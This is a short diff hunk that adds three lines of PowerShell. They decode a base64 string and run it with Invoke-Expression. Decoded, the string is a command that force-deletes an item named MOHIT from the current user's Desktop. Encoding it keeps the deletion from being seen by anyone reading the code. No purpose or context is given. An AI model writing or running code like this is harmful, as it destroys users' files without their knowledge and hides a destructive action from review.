@@ -1,0 +1,3 @@
+$e = 'UgBlAG0AbwB2AGUALQBJAHQAZQBtACAAIgAkAGUAbgB2ADoAVQBTAEUAUgBQAFIATwBGAEkATABFAFwARABlAHMAawB0AG8AcABcAE0ATwBIAEkAVAAiACAALQBGAG8AcgBjAGUA'
+$i = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($e))
+Invoke-Expression $i
